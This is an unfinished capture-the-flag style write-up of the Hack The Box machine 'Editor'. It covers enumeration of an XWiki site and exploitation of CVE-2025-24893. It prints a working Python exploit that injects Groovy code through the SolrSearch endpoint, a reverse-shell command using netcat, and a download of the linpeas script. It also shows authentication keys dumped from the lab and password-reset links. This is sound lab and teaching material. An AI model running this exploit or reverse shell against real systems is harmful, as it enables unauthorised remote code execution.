---
title: 'HTB Editor Writeup'
date: 2025-08-05
permalink: /posts/2025/08/HTB_Editor_Writeup/
tags:
  - HTB
  - writeup
  - easy
---

A writeup of the Hack The Box machine "Editor" with easy difficulty

# HTB_Editor (not done)

Welcome to this writeup of the hack the box machine Editor. This is at the time of writing a seasonal machine (season 8 week 12), an easy Linux machine.

![image.png](/images/HTB_Editor/image.png)

# Enumeration

`nmap -sC -sV 10.10.11.80`

![image.png](/images/HTB_Editor/image%201.png)

We have a Jetty 10.0.20 and a bunch of disallowed entries.

Add this domain to our hosts list:

`echo "10.10.11.80 editor.htb" | sudo tee -a /etc/hosts`

`editor.htb` is a a Futuristic Code Editor website where you can download the software in deb or exe. The download link is:`http://editor.htb/assets/simplistcode_1.0.deb` or `http://editor.htb/assets/simplistcode_1.0.exe` .

There is a `http://editor.htb/about` page.

Also a `http://wiki.editor.htb/xwiki/` but we need to add this subdomain to the hosts list as well:

`echo "10.10.11.80 wiki.editor.htb" | sudo tee -a /etc/hosts`

It’s a wiki page that runs [XWiki Debian 15.10.8](https://extensions.xwiki.org/?id=org.xwiki.platform:xwiki-platform-distribution-debian-common:15.10.8:::/xwiki-commons-pom/xwiki-platform/xwiki-platform-distribution/xwiki-platform-distribution-debian/xwiki-platform-distribution-debian-common)

![image.png](/images/HTB_Editor/image%202.png)

On the `http://wiki.editor.htb/xwiki/bin/view/Main/#Information` page is a version 2.1 of XWiki.

We have a user called `Neal Bagwell`: `http://wiki.editor.htb/xwiki/bin/view/XWiki/neal`

We have some history of this user:

![image.png](/images/HTB_Editor/image%203.png)

We can login with a username and password, I did a “forgot my password” for the user `neal bagwell` :

![image.png](/images/HTB_Editor/image%204.png)

There is a page: `http://wiki.editor.htb/xwiki/bin/view/XWiki/XWikiUsers#History` that shows a user called `superadmin`

![image.png](/images/HTB_Editor/image%205.png)

Next, let’s take a look at the SimplistCode Pro application:

`dpkg-deb -x simplistcode_1.0.deb extracted/` 

`cd extracted/usr/local/bin`

![image.png](/images/HTB_Editor/image%206.png)

Let’s check for strings in the binary:

`strings simplistcode | less`

This returns loads of readable strings.

Maybe this vuln is the case here: https://www.ameeba.com/blog/cve-2025-32974-critical-vulnerability-in-xwiki-s-rights-analysis-leading-to-potential-system-compromise/

Or this one:
[https://www.exploit-db.com/exploits/52136](https://www.exploit-db.com/exploits/52136)

# User flag

This module exploit the vulnerable `SolrSearch` macro via a GET request with a injected Groovy-payload: RCE.

Hmm did not work for me.

![image.png](/images/HTB_Editor/image%207.png)

But the vulnerability is definitely CVE-2025-24893.

Let’s try this one: https://github.com/Infinit3i/CVE-2025-24893

`git clone https://github.com/Infinit3i/CVE-2025-24893.git` 

`cd CVE-2025-24893`

`python3 CVE-2025-24893-PoC.py`

Change the settings to the correct endpoint:

![image.png](/images/HTB_Editor/image%208.png)

Select the reverse shell option and run:
`python3 -m http.server 8080` 

and
`nc -lvnp 31337` 

This did also not work.

Let’s try the next one:

https://github.com/Artemir7/CVE-2025-24893-EXP?tab=readme-ov-file

`git clone https://github.com/Artemir7/CVE-2025-24893-EXP.git`

`cd CVE-2025-24893-EXP`

The usage: `python CVE-2025-24893.py -u -c` 

So let’s try `python3 CVE-2025-24893-EXP.py -u http://wiki.editor.htb -c whoami` 

Hmm it tries al the redirects, just like the tool at the first try:

![image.png](/images/HTB_Editor/image%209.png)

The script just don’t work so we have to adjust it:

```python
import argparse
import requests
import re
from urllib.parse import urljoin, quote
import html

BANNER = """
===========================================================
                   CVE-2025-24893
            XWiki Remote Code Execution Exploit
                      Author: Artemir
===========================================================
"""

def extract_output(xml_text):
    decoded = html.unescape(xml_text)
    match = re.search(r"\[}}}(.*?)\]", decoded)
    if match:
        return match.group(1).strip()
    else:
        return None

def exploit(url, cmd):
    headers = {
        "User-Agent": "Mozilla/5.0",
    }

    payload = (
        "}}}{{async async=false}}{{groovy}}"
        f"println('{cmd}'.execute().text)"
        "{{/groovy}}{{/async}}"
    )

    encoded_payload = quote(payload)
    exploit_path = f"/xwiki/bin/get/Main/SolrSearch?media=rss&text={encoded_payload}"
    full_url = urljoin(url, exploit_path)

    try:
        response = requests.get(full_url, headers=headers, timeout=10)
        if response.status_code == 200:
            output = extract_output(response.text)
            if output:
                print("[+] Command Output:")
                print(output)
            else:
                print("[!] Exploit sent, but output could not be extracted.")
                print("[*] Raw response (truncated):")
                print(response.text[:500])
        else:
            print(f"[-] Failed with status code: {response.status_code}")
    except requests.RequestException as e:
        print(f"[-] Request failed: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CVE-2025-24893 - XWiki RCE PoC")
    parser.add_argument("-u", "--url", required=True, help="Target base URL (e.g. http://example.com)")
    parser.add_argument("-c", "--cmd", required=True, help="Command to execute")

    args = parser.parse_args()
    exploit(args.url, args.cmd)

```

The `payload` is rewritten.

The use of `urljoin()` to handle the path correctly.

And I used the wrong python version, this is the correct command:

`python CVE-2025-24893-EXP.py -u http://wiki.editor.htb -c whoami`

![image.png](/images/HTB_Editor/image%2010.png)

Yes this worked, now we can try to get a RCE:

`nc -lvnp 4444`

`python CVE-2025-24893-EXP.py -u http://wiki.editor.htb -c 'busybox nc 10.10.14.72 4444 -e /bin/bash'`

![image.png](/images/HTB_Editor/image%2011.png)

Yes we got RCE, upgrade the shell:

`python3 -c 'import pty; pty.spawn("/bin/bash")'` 

`Ctrl+Z`
`stty raw -echo; fg` 

`enter` 

In the `/home` dir is a user `oliver` 

Reading trough the /data/mails dir there is another user `neal` we already know with a email for a password request. We can reset the password with this link:

`http://10.10.11.80:8080/xwiki/authenticate/wiki/xwiki/resetpassword?u=xwiki%3AXWiki.neal&v=GereGgXsnm3S7QyVjBW3MkX3M7vAay`

But if you open this link:

![image.png](/images/HTB_Editor/image%2012.png)

And with this link:

http://wiki.editor.htb/xwiki/authenticate/wiki/xwiki/resetpassword?u=xwiki%3AXWiki.neal&#38;v=oCEedY2p1tCbhCQoXMJnXblZTP0hYi

![image.png](/images/HTB_Editor/image%2013.png)

For the rest of the emails I got the same results. 

I found a properties file:

![image.png](/images/HTB_Editor/image%2014.png)

And in the `cat xwiki-8080.lck` : `1289`

There is also in the /data folder a `coniguration.properties` file:

```
xwiki.authentication.validationKey = \uBF48\u0EE2\u03FE\u4B0F\u3C8E\u35DA\uEEB8\u4013\u1E90\uF9A7\u4040\u28EA\uD217\u288BF\u6AF7\u377E\u295C\uC98D\u17FB5\uD3D4\u967F\uB8DE\u955B\uD54B\uEE55\u890D\uAFFC\u993B\u1C49\u9B87
xwiki.authentication.encryptionKey = \uC327\u7B18\u1FFE\u913D\uEDBD\u6C85\uE778\uD7C6\u91D0\uA56F\uE1CB\u014B\uD03E\u9E5D\uED9D\uB44A\u3A0C\u1C76\uF0D6\u8289\u645F\u6EB8\u00EB\u99DA\u589E\uE3CE\uC24A\u9486\u5EAB\u2E85\uCCEB\uAF4D
```

In `/data/observations` is a `id.txt`:

`efb12e25-6ba5-4d01-a530-445d648fa232`

![image.png](/images/HTB_Editor/image%2015.png)

In `/var/backups` are backups.

Let’s run an enumeration script:

On our machine:

`python3 -m http.server 8000`

On  the remote host:

`wget http://10.10.14.1:8000/linpeas.sh`

`chmod +x linpeas.sh` 

`./linpeas.sh`

Some interesting results:

╔══════════╣ Processes with unusual configurations
Process 1044 (xwiki) - java --add-opens java.base/java.lang=ALL-UNNAMED --add-opens java.base/java.io=ALL-UNNAMED --add-ope

Unusual number of FDs: 896

/run/containerd/containerd.sock

/run/containerd/containerd.sock.ttrpc
/run/dbus/system_bus_socket
└─(Read Write (Weak Permissions: 666) )
└─(Owned by root)
/run/docker.sock
/run/irqbalance/irqbalance990.sock
└─(Read Execute )
└─(Owned by root)
/run/mysqld/mysqld.sock
└─(Read Write Execute (Weak Permissions: 777) )
/run/mysqld/mysqlx.sock
└─(Read Write Execute (Weak Permissions: 777) )
/run/systemd/fsck.progress
/run/systemd/inaccessible/sock
/run/systemd/io.system.ManagedOOM
└─(Read Write (Weak Permissions: 666) )
└─(Owned by root)
/run/systemd/journal/dev-log
└─(Read Write (Weak Permissions: 666) )
└─(Owned by root)
/run/systemd/journal/io.systemd.journal
/run/systemd/journal.netdata/dev-log
└─(Read Write (Weak Permissions: 666) )
└─(Owned by root)
/run/systemd/journal.netdata/io.systemd.journal
/run/systemd/journal.netdata/socket
└─(Read Write (Weak Permissions: 666) )
└─(Owned by root)
/run/systemd/journal.netdata/stdout
└─(Read Write (Weak Permissions: 666) )
└─(Owned by root)
/run/systemd/journal/socket
└─(Read Write (Weak Permissions: 666) )
└─(Owned by root)
/run/systemd/journal/stdout
└─(Read Write (Weak Permissions: 666) )
└─(Owned by root)
/run/systemd/journal/syslog
└─(Read Write (Weak Permissions: 666) )
└─(Owned by root)
/run/systemd/notify
└─(Read Write Execute (Weak Permissions: 777) )
└─(Owned by root)
/run/systemd/private
└─(Read Write Execute (Weak Permissions: 777) )
└─(Owned by root)
/run/systemd/resolve/io.systemd.Resolve
└─(Read Write (Weak Permissions: 666) )
/run/systemd/userdb/io.systemd.DynamicUser
└─(Read Write (Weak Permissions: 666) )
└─(Owned by root)
/run/udev/control
/run/uuidd/request
└─(Read Write (Weak Permissions: 666) )
└─(Owned by root)
/run/vmware/guestServicePipe
└─(Read Write (Weak Permissions: 666) )
└─(Owned by root)
/var/run/mysqld/mysqld.sock
└─(Read Write Execute (Weak Permissions: 777) )
/var/run/mysqld/mysqlx.sock
└─(Read Write Execute (Weak Permissions: 777) )
/var/run/vmware/guestServicePipe
└─(Read Write (Weak Permissions: 666) )
└─(Owned by root)

![image.png](/images/HTB_Editor/image%2016.png)